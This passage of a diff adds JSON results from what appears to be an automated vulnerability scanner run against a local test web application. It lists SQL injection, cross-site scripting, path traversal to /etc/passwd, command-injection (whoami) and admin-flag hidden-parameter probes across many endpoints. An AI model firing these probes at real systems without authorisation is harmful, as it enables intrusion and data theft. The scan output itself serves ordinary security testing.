+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/2fa/verify?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/change-password?current=",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/change-password?current=&q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/change-password?current=",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/change-password?current=&q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/change-password?current=",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/change-password?current=&file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/change-password?current=",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/change-password?current=&cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/change-password?current=",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/change-password?current=&search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/deluxe-membership",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/deluxe-membership?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/deluxe-membership",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/deluxe-membership?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/deluxe-membership",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/deluxe-membership?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/deluxe-membership",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/deluxe-membership?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/deluxe-membership",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/deluxe-membership?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/authentication-details/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/authentication-details/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/authentication-details/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/authentication-details/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/authentication-details/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/authentication-details/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/authentication-details/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/authentication-details/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/authentication-details/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/authentication-details/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/captcha",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/captcha?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/captcha",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/captcha?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/captcha",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/captcha?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/captcha",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/captcha?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/captcha",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/captcha?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "userId",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "account",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "item",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "role",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "role",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "debug",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "debug",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "access",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "privilege",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "auth",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "token",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "role",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "debug",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "debug",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "access",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "access",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "privilege",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "privilege",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "auth",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "token",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "param": "token",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt/apply/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt/apply/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt/apply/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt/apply/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt/apply/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt/apply/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/saveLoginIp",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/saveLoginIp?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
